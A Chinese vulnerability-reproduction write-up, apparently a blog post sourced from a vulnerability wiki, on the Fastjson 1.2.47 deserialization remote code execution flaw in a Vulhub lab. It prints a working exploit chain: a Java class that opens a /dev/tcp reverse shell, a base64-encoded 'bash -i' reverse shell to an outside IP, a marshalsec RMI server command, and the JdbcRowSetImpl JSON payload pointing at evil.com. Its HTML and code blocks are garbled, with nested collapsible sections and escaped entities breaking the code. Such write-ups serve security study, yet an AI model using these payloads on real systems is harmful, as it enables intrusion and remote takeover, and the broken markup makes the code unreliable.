---
title: "Fastjson 1.2.47 远程命令执行漏洞"
date: 2026-10-13 09:02:04
categories:
  - WebSecurity
  - CVE
  - "三方组件"
  - "Fastjson"
tags:
  - "Fastjson"
  - "命令执行"
  - "代码执行"
  - "反序列化"
  - "漏洞复现"
---
## 漏洞描述

Fastjson 是阿里巴巴公司开源的一款 json 解析器，其性能优越，被广泛应用于各大厂商的 Java 项目中。fastjson 于 1.2.24 版本后增加了反序列化白名单，而在 1.2.48 以前的版本中，攻击者可以利用特殊构造的 json 字符串绕过白名单检测，成功执行任意命令。

参考链接：

- https://cert.360.cn/warning/detail?id=7240aeab581c6dc2c9c5350756079955
- https://www.freebuf.com/vuls/208339.html

## 环境搭建

Vulhub 执行如下命令启动一个 spring web 项目，其中使用 fastjson 作为默认 json 解析器：

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-shell">docker-compose up -d
&lt;details&gt;
&lt;summary&gt;POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）&lt;/summary&gt;

&lt;pre&gt;&lt;code class="language-text"&gt;
环境启动后，访问 `http://your-ip:8090` 即可看到一个 json 对象被返回，我们将 content-type 修改为 `application/json` 后可向其 POST 新的 JSON 对象，后端会利用 fastjson 进行解析。

## 漏洞复现

目标环境是 `openjdk:8u102`，这个版本没有 `com.sun.jndi.rmi.object.trustURLCodebase` 的限制，我们可以简单利用 RMI 进行命令执行。

首先编译并上传命令执行代码，如 `http://evil.com/TouchFile.class`：

```java
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = &#82;untime.getRuntime();
            String[] commands = {"/bin/bash","-c","exec 5&amp;lt;&amp;gt;&amp;#47;dev/tcp/192.168.174.128/9999;cat &amp;lt;&amp;amp;5 | while read line; do $line 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; done"};
            Process pc = rt.&amp;#101;xec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}&lt;/code&gt;&lt;/pre&gt;

&lt;/details&gt;

也可以使用 bash base64 的方式：

```java
String[] commands = {"bash", "-c","{echo, &#89;mFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuNDMuMTQ3LjEyNy85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}"};
&lt;details&gt;
&lt;summary&gt;POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）&lt;/summary&gt;

&lt;pre&gt;&lt;code class="language-text"&gt;
然后我们借助 [&amp;#109;arshalsec](https://github.com/mbechler/&amp;#109;arshalsec) 项目，启动一个 RMI 服务器，监听 8888 端口，并制定加载远程类 `TouchFile.class`：

```shell
java -cp &amp;#109;arshalsec-0.0.3-SNAPSHOT-all.jar &amp;#109;arshalsec.jndi.RMIRefServer "http://evil.com/#TouchFile" 9999&lt;/code&gt;&lt;/pre&gt;

&lt;/details&gt;

向靶场服务器发送 Payload（此处的 Payload 和 Fastjson 1.2.24 不同）：
</code></pre>

</details>
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://evil.com:8888/TouchFile",
        "autoCommit":true
    }
}
```

![image-20220223130855285](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/framework/images/202202231308359.png)

监听 9999 端口，接收反弹 shell：

![image-20220223130812872](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/framework/images/202202231308945.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/framework/Fastjson-1.2.47-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
